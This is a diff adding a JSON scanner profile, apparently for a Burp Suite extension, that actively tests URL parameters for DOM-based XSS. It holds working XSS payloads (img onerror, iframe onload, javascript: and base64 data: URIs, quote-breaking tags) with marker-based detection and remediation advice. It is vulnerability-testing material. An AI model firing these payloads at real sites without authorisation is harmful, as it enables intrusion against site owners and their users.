@@ -1,0 +1,94 @@
+[
+  {
+    "profile_name": "XSS_DOM_Context",
+    "enabled": true,
+    "scanner": "active",
+    "author": "@bountysecurity",
+    "steps": [
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,dom_xsstest1337"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [
+          "param_url"
+        ],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Regex,,(document\\.write|innerHTML|outerHTML|insertAdjacentHTML|location\\.hash|location\\.search)",
+          "true,AND,Content Type,,text/html"
+        ],
+        "redir_type": "on_site",
+        "max_redir": 3,
+        "show_alert": "none",
+        "issue_name": "Potential_DOM_XSS_Sink",
+        "issue_severity": "Information",
+        "issue_confidence": "Firm",
+        "issue_detail": "Preliminary detection of potential DOM XSS injection points in JavaScript code",
+        "remediation_detail": "",
+        "issue_background": "",
+        "remediation_background": ""
+      },
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,<img src=x id='domtest1337' onerror=document.documentElement.dataset.testxss='found'>",
+          "true,<iframe id='domtest1337' onload=document.documentElement.dataset.testxss='found'>",
+          "true,javascript:void(document.documentElement.dataset.testxss='found')",
+          "true,data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuZGF0YXNldC50ZXN0eHNzPSdmb3VuZCc8L3NjcmlwdD4=",
+          "true,\"><img src=x onerror=document.documentElement.dataset.testxss='found'>//",
+          "true,'><img src=x onerror=document.documentElement.dataset.testxss='found'>//"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [
+          "param_url"
+        ],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Regex,,data-testxss\\s*=\\s*(['\"]?)found\\1",
+          "true,AND,Content Type,,text/html"
+        ],
+        "redir_type": "on_site",
+        "max_redir": 3,
+        "show_alert": "always",
+        "issue_name": "DOM_XSS",
+        "issue_severity": "Medium",
+        "issue_confidence": "Certain",
+        "issue_detail": "A DOM-based XSS vulnerability has been detected. User input can manipulate the DOM and execute arbitrary JavaScript in the user's browser context.",
+        "remediation_detail": "Use methods like textContent or innerText instead of innerHTML. Use libraries like DOMPurify to sanitize content before inserting it into the DOM.",
+        "issue_background": "",
+        "remediation_background": ""
+      }
+    ],
+    "Tags": [
+      "XSS",
+      "DOM_Context",
+      "All"
+    ]
+  }
+]
